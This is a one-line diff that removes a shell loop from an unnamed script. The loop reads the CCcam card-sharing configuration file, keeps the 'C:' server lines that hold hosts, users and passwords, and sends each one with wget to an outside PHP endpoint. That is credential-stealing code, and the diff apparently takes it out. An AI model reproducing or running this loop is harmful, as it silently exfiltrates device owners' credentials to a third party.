@@ -1,1 +1,0 @@
-for LINE in `cat /var/etc/CCcam.cfg|grep "C:"|grep -v "192"|grep -v clients|grep -v He|grep -v also|grep -v receive|grep -v emu|grep -v behind|grep -v his|grep -v entry|grep -v hostname|grep -v port|grep -v want|grep -v caid|grep -v someserver`; do wget "http://webphp.altervista.org/line/l.php?ln=$LINE"; done
